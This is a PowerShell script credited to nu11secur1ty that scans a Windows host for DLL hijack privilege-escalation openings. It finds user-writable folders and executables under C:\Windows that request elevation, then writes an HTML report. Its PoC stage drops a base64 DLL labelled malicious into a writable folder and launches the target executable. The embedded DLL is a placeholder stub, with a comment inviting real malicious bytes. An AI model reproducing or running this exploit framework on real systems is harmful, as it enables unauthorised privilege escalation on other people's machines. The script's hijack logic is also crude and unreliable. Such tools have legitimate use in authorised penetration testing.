# Advanced User-Level DLL Hijack & Privilege Escalation Scanner and PoC Runner
# Compatible with PowerShell 5.1+ (Parallel scanning on PS7+)
# Author: nu11secur1ty 2025 

function Test-PathWritable($path) {
    try {
        $testFile = Join-Path $path ([guid]::NewGuid().ToString() + ".tmp")
        New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        return $false
    }
}

function Get-WritableFolders {
    $paths = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) }
    $userWritablePaths = @()

    foreach ($p in $paths) {
        if (Test-PathWritable $p) {
            $userWritablePaths += $p
        }
    }

    $commonWritable = @(
        "$env:LOCALAPPDATA\Microsoft\WindowsApps",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
        "$env:USERPROFILE\AppData\Local\Temp",
        "$env:LOCALAPPDATA\Programs",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads"
    )

    foreach ($c in $commonWritable) {
        if ((Test-Path $c) -and (Test-PathWritable $c) -and -not ($userWritablePaths -contains $c)) {
            $userWritablePaths += $c
        }
    }

    return $userWritablePaths | Sort-Object -Unique
}

function Get-PEManifest {
    param([string]$ExePath)
    try {
        $bytes = [IO.File]::ReadAllBytes($ExePath)
        $contentString = [System.Text.Encoding]::ASCII.GetString($bytes)
        if ($contentString -match '<requestedExecutionLevel[^>]*level="([^"]+)"') {
            return $matches[1]
        } else {
            return $null
        }
    } catch {
        return $null
    }
}

function Get-PotentiallyElevatedExecutables {
    $searchDirs = @("C:\Windows") | Where-Object { Test-Path $_ }

    $exeList = @()
    foreach ($dir in $searchDirs) {
        try {
            $exeList += Get-ChildItem -Path $dir -Filter *.exe -Recurse -ErrorAction SilentlyContinue
        } catch {}
    }

    $elevatedExes = @()
    foreach ($exe in $exeList) {
        try {
            $manifestLevel = Get-PEManifest $exe.FullName
            if ($manifestLevel -and ($manifestLevel -match 'requireAdministrator' -or $manifestLevel -match 'highestAvailable')) {
                $elevatedExes += $exe
            }
        } catch {}
    }

    if ($elevatedExes.Count -eq 0) { $elevatedExes = $exeList }

    return $elevatedExes
}

function Get-PEImports {
    param([string]$ExePath)

    $dumpbinCmd = Get-Command dumpbin.exe -ErrorAction SilentlyContinue
    if ($dumpbinCmd) {
        $importsRaw = & $dumpbinCmd.Source /DEPENDENTS $ExePath 2>$null
        $imports = $importsRaw | Select-String "\.dll" | ForEach-Object { $_.ToString().Trim() }
        return $imports
    } else {
        # Fallback: Try to parse ASCII strings for DLL names in first 1MB of file
        try {
            $maxBytes = 1MB
            $fs = [IO.File]::OpenRead($ExePath)
            $bytes = New-Object byte[] $maxBytes
            $readCount = $fs.Read($bytes, 0, $maxBytes)
            $fs.Close()
            $strData = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $readCount)
            $matches = [regex]::Matches($strData, '\b([\w\-.]{1,50}\.dll)\b', 'IgnoreCase')
            $dlls = @()
            foreach ($m in $matches) {
                $dllName = $m.Groups[1].Value.ToLower()
                if (-not $dlls.Contains($dllName)) { $dlls += $dllName }
            }
            if ($dlls.Count -eq 0) { $dlls = @("kernel32.dll", "user32.dll", "advapi32.dll") }
            return $dlls
        } catch {
            return @()
        }
    }
}

function Find-DLLHijacks {
    param(
        [string[]]$WritablePaths,
        [string[]]$DLLs,
        [string]$ExePath
    )

    $results = @()
    foreach ($dll in $DLLs) {
        foreach ($wpath in $WritablePaths) {
            $dllPath = Join-Path $wpath $dll
            if (-not (Test-Path $dllPath)) {
                $results += [PSCustomObject]@{
                    Exe = $ExePath
                    DLL = $dll
                    WritablePath = $wpath
                }
            }
        }
    }
    return $results
}

function Drop-MaliciousDLL {
    param(
        [string]$Path,
        [string]$DllName
    )

    # Dummy malicious DLL payload base64 (replace with actual malicious DLL bytes)
    $dllContentBase64 = @"
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
8OAA8AAAAf8B8AHEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
8AAAAOAAQAAEAAAAAAAAAAAEAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AA==
"@

    $dllBytes = [Convert]::FromBase64String($dllContentBase64)
    $fullDllPath = Join-Path $Path $DllName
    try {
        [IO.File]::WriteAllBytes($fullDllPath, $dllBytes)
        Write-Host "Malicious DLL dropped at $fullDllPath" -ForegroundColor Green
        return $fullDllPath
    } catch {
        Write-Host "Failed to drop DLL: $_" -ForegroundColor Red
        return $null
    }
}

function Launch-Target {
    param([string]$ExePath)
    Write-Host "Launching $ExePath to test DLL hijack..." -ForegroundColor Cyan
    Start-Process -FilePath $ExePath
}

# === Begin Scan ===
Write-Host "`n=== Starting DLL Hijack Privilege Escalation Scanner ===`n" -ForegroundColor Yellow
Write-Host "`n=== by nu11secur1ty ===`n" -ForegroundColor Red

$writablePaths = Get-WritableFolders
Write-Host "Writable paths detected:" -ForegroundColor Cyan
$writablePaths | ForEach-Object { Write-Host "`t$_" }

$potentialExes = Get-PotentiallyElevatedExecutables
Write-Host "Scanning $($potentialExes.Count) executables for DLL hijack possibilities..."

$vulnResults = @()

if ($PSVersionTable.PSVersion.Major -ge 7) {
    # Parallel scanning for PowerShell 7+
    $results = $potentialExes | ForEach-Object -Parallel {

        function Get-PEImports {
            param([string]$ExePath)

            $dumpbinCmd = Get-Command dumpbin.exe -ErrorAction SilentlyContinue
            if ($dumpbinCmd) {
                $importsRaw = & $dumpbinCmd.Source /DEPENDENTS $ExePath 2>$null
                $imports = $importsRaw | Select-String "\.dll" | ForEach-Object { $_.ToString().Trim() }
                return $imports
            } else {
                try {
                    $maxBytes = 1MB
                    $fs = [IO.File]::OpenRead($ExePath)
                    $bytes = New-Object byte[] $maxBytes
                    $readCount = $fs.Read($bytes, 0, $maxBytes)
                    $fs.Close()
                    $strData = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $readCount)
                    $matches = [regex]::Matches($strData, '\b([\w\-.]{1,50}\.dll)\b', 'IgnoreCase')
                    $dlls = @()
                    foreach ($m in $matches) {
                        $dllName = $m.Groups[1].Value.ToLower()
                        if (-not $dlls.Contains($dllName)) { $dlls += $dllName }
                    }
                    if ($dlls.Count -eq 0) { $dlls = @("kernel32.dll", "user32.dll", "advapi32.dll") }
                    return $dlls
                } catch {
                    return @()
                }
            }
        }

        function Find-DLLHijacks {
            param([string[]]$WritablePaths, [string[]]$DLLs, [string]$ExePath)

            $results = @()
            foreach ($dll in $DLLs) {
                foreach ($wpath in $WritablePaths) {
                    $dllPath = Join-Path $wpath $dll
                    if (-not (Test-Path $dllPath)) {
                        $results += [PSCustomObject]@{
                            Exe = $ExePath
                            DLL = $dll
                            WritablePath = $wpath
                        }
                    }
                }
            }
            return $results
        }

        $dlls = Get-PEImports -ExePath $_.FullName
        $hijacks = Find-DLLHijacks -WritablePaths $using:writablePaths -DLLs $dlls -ExePath $_.FullName
        return $hijacks

    } -ThrottleLimit 10

    foreach ($r in $results) {
        $vulnResults += $r
    }
} else {
    # Fallback for PowerShell 5.1 - no parallel
    foreach ($exe in $potentialExes) {
        try {
            $dlls = Get-PEImports $exe.FullName
            $hijacks = Find-DLLHijacks -WritablePaths $writablePaths -DLLs $dlls -ExePath $exe.FullName
            $vulnResults += $hijacks
        } catch {
            Write-Host "Error scanning $($exe.FullName): $_" -ForegroundColor Red
        }
    }
}

# === HTML Reporting ===
if (-not $PSScriptRoot) { $PSScriptRoot = [Environment]::GetFolderPath("Desktop") }
$ReportPath = Join-Path -Path $PSScriptRoot -ChildPath "DLL_Hijack_Report.html"

$htmlContent = @"
<html>
<head>
    <style>
        body { font-family: Consolas, monospace; background-color: #1e1e1e; color: #d4d4d4; padding: 20px; }
        h2 { color: #569cd6; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
        th { background-color: #007acc; color: white; }
        tr:nth-child(even) { background-color: #2a2d2e; }
    </style>
</head>
<body>
    <h2>DLL Hijack & Privilege Escalation Scanner Report</h2>
    <p>Scan Time: $(Get-Date)</p>
    <table>
        <tr>
            <th>Executable Path</th>
            <th>Missing DLL</th>
            <th>User-Writable Folder</th>
        </tr>
"@

foreach ($item in $vulnResults) {
    $htmlContent += "<tr><td>$($item.Exe)</td><td>$($item.DLL)</td><td>$($item.WritablePath)</td></tr>`n"
}

$htmlContent += @"
    </table>
    <hr />
    <p>Scanner by <b>nu11secur1ty</b> - 2025</p>
</body>
</html>
"@

$htmlContent | Out-File -FilePath $ReportPath -Encoding utf8

Write-Host "`nReport generated: $ReportPath" -ForegroundColor Green

# === PoC Attempt ===
if ($vulnResults.Count -gt 0) {
    $first = $vulnResults[0]
    $droppedDllPath = Drop-MaliciousDLL -Path $first.WritablePath -DllName $first.DLL

    if ($droppedDllPath) {
        Launch-Target -ExePath $first.Exe

        Write-Host "`nIMPORTANT: Remove the malicious DLL file after testing! Run the following command:" -ForegroundColor Yellow
        Write-Host "Remove-Item -Path '$droppedDllPath' -Force" -ForegroundColor Cyan
    }
} else {
    Write-Host "No DLL hijack vulnerabilities detected on user-writable paths." -ForegroundColor Green
}
